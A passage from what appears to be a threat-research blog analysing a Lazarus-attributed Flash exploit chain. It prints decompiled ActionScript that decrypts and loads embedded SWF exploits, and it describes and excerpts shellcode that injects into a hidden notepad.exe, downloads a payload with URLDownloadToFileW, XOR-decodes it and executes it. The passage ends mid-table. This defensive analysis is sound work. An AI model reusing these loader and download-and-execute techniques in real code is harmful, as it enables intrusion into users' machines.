   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>05</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="color: #006699;">var</span> pShell:<span style="color: grey;">String</span> = params[<span style="color: blue;">"shell"</span>] as <span style="color: grey;">String</span>;</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>06</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="color: #006699;">var</span> objShellData:SharedObject = SharedObject.getLocal(<span style="color: blue;">"Exp_Data"</span>);</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>07</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>objShellData.clear();</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>08</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>objShellData.data.shell = pShell;</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>09</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>objShellData.flush();</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>10</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="color: #006699;">var</span> blob:ByteArray = <span style="color: #006699;">new</span> orinBin() as <span style="color: grey;">ByteArray</span>;</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>11</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="color: #006699;">var</span> i:<span style="color: grey;">int</span> = 0;</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>12</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="color: #006699;">while</span>(i &lt; blob.length)</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>13</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>{</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>14</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 36px;">blob[i] = blob[i] ^ key.charCodeAt(i % key.length);</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>15</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 36px;">i++;</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>16</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>}</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>17</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>blob.position = 0;</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>18</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>objLoader.contentLoaderInfo.addEventListener(<span style="color: blue;">"complete"</span>,fncomp);</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>19</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>objLoader.loadBytes(blob);</code>
   </td>
</tr>
</tbody></table>
</div>
<br />
Below is the binary blob <code>orinBin</code> as seen within the SWF file:<br />
<br />
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioVcdSN24rq9qINIg1VPCOq1nCBucs_JEbq7Z5EpqlsqZ91r5rQgpeSP4j7TDiDQ7o7soHpcoaBud_SkOLq7thI08i-ZDbRYXLrTUlqPvjQOdAhGgwOdWJY1_zwm_ah3JdkvqPNk3QEqw/s1600/image4.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEioVcdSN24rq9qINIg1VPCOq1nCBucs_JEbq7Z5EpqlsqZ91r5rQgpeSP4j7TDiDQ7o7soHpcoaBud_SkOLq7thI08i-ZDbRYXLrTUlqPvjQOdAhGgwOdWJY1_zwm_ah3JdkvqPNk3QEqw/s1600/image4.png" /></a></div>
<br />
By knowing the value of <code>Health</code> parameter, it is now possible to use it as an XOR key to decode the <code>orinBin</code> blob within the SWF code.<br />
<br />
Once decrypted, the <code>orinBin</code> blob presents another SWF file. This time, it contains 3 encrypted blobs within: <code>bin22</code>, <code>bin23</code>, and <code>bin24</code> seen below:<br />
<br />
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3wtRhQ9u7R6JB_DpR9kU0K7FfUKbwNga8q9g6r-lKhKV9awjewfMo0sGFEmo7G5Nl9PEBwqgSGB9v3kM5lmCAJ-IAEnwW1pszam-wWIfIRD4r3dj7FQwT788U79i7LefeqdJnVrSZsh8/s1600/image5.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3wtRhQ9u7R6JB_DpR9kU0K7FfUKbwNga8q9g6r-lKhKV9awjewfMo0sGFEmo7G5Nl9PEBwqgSGB9v3kM5lmCAJ-IAEnwW1pszam-wWIfIRD4r3dj7FQwT788U79i7LefeqdJnVrSZsh8/s1600/image5.png" /></a></div>
<br />
<br />
The code decrypts the blobs with RC4, using <code>"littleEndian"</code> as the RC4 key. These blobs also turn out to be SWF files that contain the SWF exploit code.<br />
<br />
Internally, the ActionScript also uses transliterated Russian words, similar to the tactic seen in the bot code:<br />
<br />
<div style="overflow-x: auto;">
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse; border: none; width: 100%px;"><tbody>
<tr>
<td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Transliterated Russian words used in AS</td>
<td style="background: #3d4146; border-left: none; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Translated from Russian</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>Podgotovkaskotiny</em></td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Preparation of farm animals</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>geigeigei3raza</em></td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Hey, hey, hey 3 times</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>chainik</em></td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Dummy (a stupid person)</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>chainikaddress</em></td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Dummy's address</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>poishemdatu</em></td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Let&#8217;s search for data</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>poiskvpro</em></td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Searching in 'pro'</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>vyzov_chainika</em></td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Calling the dummy (a stupid person)</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>daiadreschainika</em></td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Get address of the dummy</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>runskotina</em></td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Execute farm animals</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>babaLEna</em></td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Old woman Lena</td>
</tr>
</tbody></table>
</div>
<br />
As seen in the table, while the words are technically Russian, their usage is out-of-context.<br />
<br />
In one code fragment, the ActionScript contains both "chainik" and "dummy":<br />
<br />
<div style="overflow-x: auto;">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; width: 100%;"><tbody>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>01</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="color: #006699;">private</span> function put_dummy_args(param1:*) : *</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>02</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>{</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>03</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 27px;"><span style="color: #006699;">return</span> chainik.call.apply(null,param1);</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>04</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>}</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>05</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="color: #006699;">private</span> function vyzov_chainika() : *</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>06</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>{</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>07</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 27px;"><span style="color: #006699;">return</span> chainik.call(null);</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>08</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>}</code>
   </td>
</tr>
</tbody></table>
</div>
<br />
As such, it is obvious that the word "dummy" has been translated into "chainik". However, the word "chainik" in Russian slang (with the literal meaning of "a kettle") is used to describe an unsophisticated person, a newbie; while, the word "dummy" in the exploit code is used to mean a "placeholder" or an "empty" data structure/argument.<br />
<br />
In the same way, it is likely the word "farm animals" was originally used to represent "a beast". Yet, it has been translated into a word that is only synonymous to "the beast" in a certain context. <br />
<br />
As a result, they have used the words "farm animals" across the shellcode instead of "beast"; which makes little sense.<br />
<br />
As in the case of sample #5 (<code>fdsvc.dll</code>), it is likely that this loose Russian translation, evidently performed by a non-Russian speaker, is intended to spoof the malware origin.<br />
<br />
<h5 style="font-size: 20px; margin-bottom: 0px;">
Shellcode</h5>
<br />
The SWF's ActionScript then loads and executes the shellcode that was passed to the SWF file. As with the <code>Health</code> parameter, by having access to the server-side code it is now possible to analyse what shellcode has been served to be executed via SWF file.<br />
<br />
The shellcode consists of 2,372 bytes of a Win32-code (in fact, 2,369 bytes padded with three zero bytes to make it 4-byte aligned).<br />
<br />
The shellcode passed via the <code>shell</code> parameter consists of two parts:<br />
<br />
<ul>
<li style="list-style-type: none; text-align: left;">&nbsp;&nbsp;&#8226;&nbsp;&nbsp;The first part of the shellcode (818 bytes) creates a hidden process of <code>notepad.exe</code>. It then injects the second part of the shellcode into it using the <em>VirtualAlloc()</em> and <em>WriteProcessMemory()</em> APIs, and finally it runs the injected code with <em>CreateRemoteThread()</em> API.</li>
<br />
<li style="list-style-type: none; text-align: left;">&nbsp;&nbsp;&#8226;&nbsp;&nbsp;The second part of the shellcode (1,551 bytes) is encoded with XOR <code>0x57</code>:</li>
</ul>
<br />
<div style="overflow-x: auto;">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; width: 100%;"><tbody>
<tr>
   <td style="background-color: #000064; color: silver; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>seg000:00000316</code>
   </td>
   <td style="background-color: #000064; color: silver; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 81px;">mov&nbsp;&nbsp;&nbsp;&nbsp;ecx, <span style="color: cyan;">1551</span></span>&nbsp;&nbsp;&nbsp;<span style="color: white;">; counter</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #000064; color: silver; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>seg000:0000031B</code>
   </td>
   <td style="background-color: #000064; color: silver; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 81px;">mov&nbsp;&nbsp;&nbsp;&nbsp;ebx, <span style="color: cyan;">57h</span></span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: white;">; XOR key</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #000064; color: silver; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>seg000:00000320</code>
   </td>
   <td style="background-color: #000064; color: silver; padding-left: 0.5em; white-space: nowrap;"><code><span style="color: white;">loop</span>:</code>
   </td>
</tr>
<tr>
   <td style="background-color: #000064; color: silver; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>seg000:00000320</code>
   </td>
   <td style="background-color: #000064; color: silver; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 81px;">xor&nbsp;&nbsp;&nbsp;&nbsp;[eax], ebx</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #000064; color: silver; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>seg000:00000322</code>
   </td>
   <td style="background-color: #000064; color: silver; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 81px;">dec&nbsp;&nbsp;&nbsp;&nbsp;ecx</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: white;">; decrement counter</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #000064; color: silver; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>seg000:00000323</code>
   </td>
   <td style="background-color: #000064; color: silver; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 81px;">inc&nbsp;&nbsp;&nbsp;&nbsp;eax</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: white;">; advance pointer</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #000064; color: silver; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>seg000:00000324</code>
   </td>
   <td style="background-color: #000064; color: silver; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 81px;">test&nbsp;&nbsp;&nbsp;ecx, ecx</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #000064; color: silver; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>seg000:00000326</code>
   </td>
   <td style="background-color: #000064; color: silver; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 81px;">jnz&nbsp;&nbsp;&nbsp;&nbsp;short <span style="color: white;">loop</span></span></code>
   </td>
</tr>
</tbody></table>
</div>
<br />
It's worth noting that both parts of the shellcode load the APIs similarly to all other tools from the Lazarus toolset, e.g.:<br />
<br />
<div style="overflow-x: auto;">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; width: 100%;"><tbody>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>01</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>urlmon_dll&nbsp;=&nbsp;<span style="color: blue;">'mlrU'</span>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #008200;">//&nbsp;Urlm</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>02</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>urlmon_dll_4&nbsp;=&nbsp;<span style="color: blue;">'d.no'</span>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #008200;">//&nbsp;on.d</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>03</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>urlmon_dll_8&nbsp;=&nbsp;<span style="color: blue;">'ll'</span>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #008200;">//&nbsp;ll</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>04</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>URLDownloadToFileW&nbsp;=&nbsp;<span style="color: blue;">'DLRU'</span>;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #008200;">//&nbsp;URLD</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>05</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>URLDownloadToFileW_4&nbsp;=&nbsp;<span style="color: blue;">'lnwo'</span>;&nbsp;&nbsp;<span style="color: #008200;">//&nbsp;ownl</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>06</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>URLDownloadToFileW_8&nbsp;=&nbsp;<span style="color: blue;">'Tdao'</span>;&nbsp;&nbsp;<span style="color: #008200;">//&nbsp;oadT</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>07</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>URLDownloadToFileW_12&nbsp;=&nbsp;<span style="color: blue;">'liFo'</span>;&nbsp;<span style="color: #008200;">//&nbsp;oFile</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>08</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>URLDownloadToFileW_16&nbsp;=&nbsp;<span style="color: blue;">'We'</span>;&nbsp;&nbsp;&nbsp;<span style="color: #008200;">//&nbsp;eW</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>09</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>hLib&nbsp;=&nbsp;LoadLibrary(&amp;urlmon.dll);</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>10</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>ptr[8]&nbsp;=&nbsp;(*(<span style="color: grey;">int</span>)ptr[4])(hLib,&nbsp;&nbsp;&nbsp;<span style="color: #008200;">//&nbsp;ptr[4]-&gt;GetProcAddress</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>11</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;URLDownloadToFileW);</code>
   </td>
</tr>
</tbody></table>
</div>
<br />
Once decoded, the second part of the shellcode reads the URL embedded at the end, then downloads and saves a file under a temporary file name, using the prefix <code>"tmp"</code>.<br />
<br />
Next, it reads the temporary file into memory, decrypts it with the following XOR loop, starting from the 318<em>th</em> byte:<br />
<br />
<div style="overflow-x: auto;">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; width: 100%;"><tbody>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>01</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="color: #006699;">for</span> (i = 317; i &lt; file_size; ++i )</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>02</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>{</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>03</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 27px;">buffer[i] ^= 0xCC ^ ((buffer[i] ^ 0xCC) &gt;&gt; 4);</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>04</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>}</code>
   </td>
</tr>
</tbody></table>
</div>
<br />
Next, it makes the decoded data executable by assigning it <code>PAGE_EXECUTE_READWRITE</code> memory protection mode, and calls it, as shown below:<br />
<br />
<div style="overflow-x: auto;">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; width: 100%;"><tbody>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>01</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>(*(<span style="color: #006699;">void</span>)(ptr[68]))(buffer&nbsp;+&nbsp;318,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #008200;">//&nbsp;ptr[68]-&gt;VirtualProtect</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>02</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file_size&nbsp;-&nbsp;318,&nbsp;&nbsp;&nbsp;<span style="color: #008200;">//&nbsp;skip&nbsp;the&nbsp;first&nbsp;318&nbsp;bytes</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>03</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PAGE_EXECUTE_READWRITE,</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>04</code>
   </td>
